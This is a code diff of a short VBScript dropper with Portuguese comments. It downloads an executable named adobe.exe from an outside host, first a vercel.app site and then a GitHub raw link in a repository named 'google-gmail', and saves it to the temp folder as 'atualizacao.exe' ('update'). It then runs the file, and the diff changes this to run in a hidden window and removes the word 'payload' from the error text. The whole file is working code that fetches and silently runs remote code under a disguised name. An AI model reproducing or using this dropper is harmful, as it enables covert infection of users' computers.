@@ -1,12 +1,17 @@
 Option Explicit
 
-Dim urlExe, destinoExe, http, stream
+Dim url, caminhoDestino, http, stream, fso
 
-urlExe = "https://testando123-blond.vercel.app/adobe.exe"
-destinoExe = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\adobe.exe"
+' URL do arquivo hospedado no GitHub (use o link RAW direto)
+url = "https://raw.githubusercontent.com/corinthias2025/google-gmail/refs/heads/main/adobe.exe"
 
+' Caminho para salvar o arquivo temporariamente
+Set fso = CreateObject("Scripting.FileSystemObject")
+caminhoDestino = fso.GetSpecialFolder(2) & "\atualizacao.exe"
+
+' Fazer o download do arquivo
 Set http = CreateObject("MSXML2.XMLHTTP")
-http.Open "GET", urlExe, False
+http.Open "GET", url, False
 http.Send
 
 If http.Status = 200 Then
@@ -14,11 +19,11 @@ If http.Status = 200 Then
     stream.Type = 1 ' binário
     stream.Open
     stream.Write http.responseBody
-    stream.Position = 0
-    stream.SaveToFile destinoExe, 2
+    stream.SaveToFile caminhoDestino, 2
     stream.Close
 
-    CreateObject("WScript.Shell").Run Chr(34) & destinoExe & Chr(34), 1, False
+    ' Executar o arquivo baixado
+    CreateObject("WScript.Shell").Run Chr(34) & caminhoDestino & Chr(34), 0, False
 Else
-    MsgBox "Falha ao baixar o payload: " & http.Status
+    MsgBox "Erro ao baixar o arquivo: " & http.Status
 End If
